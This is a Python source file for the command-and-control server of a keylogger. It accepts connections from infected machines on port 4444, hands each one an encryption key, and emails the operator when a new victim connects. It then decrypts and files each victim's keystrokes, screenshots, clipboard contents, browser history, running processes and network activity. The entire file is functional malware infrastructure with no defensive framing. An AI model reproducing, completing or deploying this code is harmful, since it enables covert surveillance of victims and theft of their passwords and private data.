import socket
import json
import base64
import os
import threading
import smtplib
from email.mime.text import MIMEText
from cryptography.fernet import Fernet

# --- Configuration ---
HOST = '0.0.0.0'  # Listen on all available network interfaces
PORT = 4444
LOG_DIR = 'remote_logs'
KEY_FILE = 'secret.key'
import configparser

# --- Email Configuration ---
config = configparser.ConfigParser()
config.read('email.config')

SMTP_SERVER = 'smtp.gmail.com'
SMTP_PORT = 587
SMTP_USERNAME = config['email']['user']
SMTP_PASSWORD = config['email']['password']
EMAIL_RECIPIENT = config['email']['user']

# --- Setup ---
os.makedirs(LOG_DIR, exist_ok=True)

# --- Encryption ---
def load_key():
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, 'rb') as f:
            return f.read()
    else:
        key = Fernet.generate_key()
        with open(KEY_FILE, 'wb') as f:
            f.write(key)
        return key

key = load_key()
fernet = Fernet(key)

def send_email_notification(client_ip):
    try:
        subject = f"New Keylogger Connection: {client_ip}"
        body = f"A new keylogger has connected from IP address: {client_ip}"
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = SMTP_USERNAME
        msg['To'] = EMAIL_RECIPIENT

        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            server.starttls()
            server.login(SMTP_USERNAME, SMTP_PASSWORD)
            server.sendmail(SMTP_USERNAME, [EMAIL_RECIPIENT], msg.as_string())
        print(f"[+] Email notification sent to {EMAIL_RECIPIENT}")
    except Exception as e:
        print(f"[!] Failed to send email notification: {e}")

def handle_client(conn, addr):
    client_ip = addr[0]
    print(f"[+] New connection from {client_ip}:{addr[1]}")
    send_email_notification(client_ip)

    client_log_dir = os.path.join(LOG_DIR, client_ip)
    os.makedirs(client_log_dir, exist_ok=True)

    try:
        # Send the key to the client immediately upon connection
        conn.sendall(key)
        print(f"[+] Sent key to {client_ip}")

        buffer = b''
        while True:
            while b'\n' in buffer:
                message, buffer = buffer.split(b'\n', 1)
                if not message:
                    continue
                try:
                    decrypted_message = fernet.decrypt(message)
                    message_json = json.loads(decrypted_message.decode('utf-8'))
                    log_data(message_json, client_ip, client_log_dir)
                except Exception as e:
                    print(f"[!] Error processing message: {e}")
            
            data = conn.recv(4096)
            if not data:
                break
            buffer += data

    except ConnectionResetError:
        print(f"[-] Connection from {client_ip} lost.")
    except Exception as e:
        print(f"[!] An error occurred with client {client_ip}: {e}")
    finally:
        conn.close()
        print(f"[-] Connection from {client_ip} closed.")

def log_data(data, client_ip, client_log_dir):
    log_type = data.get('type')
    timestamp = data.get('timestamp', 'No Timestamp')
    
    if log_type == 'keystroke':
        application = data.get('application', 'UNKNOWN')
        log_entry = f"[{timestamp}] Keystroke: {data.get('key')} (Application: {application}, Window: {data.get('window_title')})"
        print(log_entry)
        with open(os.path.join(client_log_dir, 'keystrokes.log'), 'a') as f:
            f.write(log_entry + '\n')
            
    elif log_type == 'screenshot':
        try:
            image_data = base64.b64decode(data['image'])
            screenshot_dir = os.path.join(client_log_dir, 'screenshots')
            os.makedirs(screenshot_dir, exist_ok=True)
            filename = os.path.join(screenshot_dir, f"screenshot_{timestamp}.png")
            with open(filename, 'wb') as f:
                f.write(image_data)
            print(f"[+] Screenshot saved: {filename}")
        except Exception as e:
            print(f"[!] Failed to save screenshot: {e}")

    elif log_type == 'system_info':
        log_entry = f"[{timestamp}] System Info: {json.dumps(data, indent=4)}"
        print(log_entry)
        with open(os.path.join(client_log_dir, 'system_info.log'), 'a') as f:
            f.write(log_entry + '\n')

    elif log_type == 'clipboard':
        log_entry = f"[{timestamp}] Clipboard: {data.get('content')}"
        print(log_entry)
        with open(os.path.join(client_log_dir, 'clipboard.log'), 'a') as f:
            f.write(log_entry + '\n')

    elif log_type == 'processes':
        log_entry = f"[{timestamp}] Running Processes:\n"
        for p in data.get('processes', []):
            log_entry += f"  - PID: {p.get('pid')}, Name: {p.get('name')}, Username: {p.get('username')}\n"
        print(log_entry)
        with open(os.path.join(client_log_dir, 'processes.log'), 'a') as f:
            f.write(log_entry)
            
    elif log_type == 'network_activity':
        log_entry = f"[{timestamp}] Network Activity:\n"
        for conn in data.get('connections', []):
            log_entry += f"  - PID: {conn.get('pid')}, Process: {conn.get('process_name')}, Local: {conn.get('local_address')}, Remote: {conn.get('remote_address')}, Status: {conn.get('status')}\n"
        print(log_entry)
        with open(os.path.join(client_log_dir, 'network_activity.log'), 'a') as f:
            f.write(log_entry)
            
    elif log_type == 'browser_history':
        log_entry = f"[{timestamp}] Browser History:\n"
        for entry in data.get('history', []):
            log_entry += f"  - Browser: {entry.get('browser')}, URL: {entry.get('url')}, Title: {entry.get('title')}, Timestamp: {entry.get('timestamp')}\n"
        print(log_entry)
        with open(os.path.join(client_log_dir, 'browser_history.log'), 'a') as f:
            f.write(log_entry)
            
    else:
        log_entry = f"[{timestamp}] Unknown data type '{log_type}': {data}"
        print(log_entry)
        with open(os.path.join(client_log_dir, 'other.log'), 'a') as f:
            f.write(log_entry + '\n')

def start_server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        print(f"[*] Listening on {HOST}:{PORT}")
        while True:
            conn, addr = s.accept()
            client_thread = threading.Thread(target=handle_client, args=(conn, addr))
            client_thread.start()

if __name__ == "__main__":
    start_server()
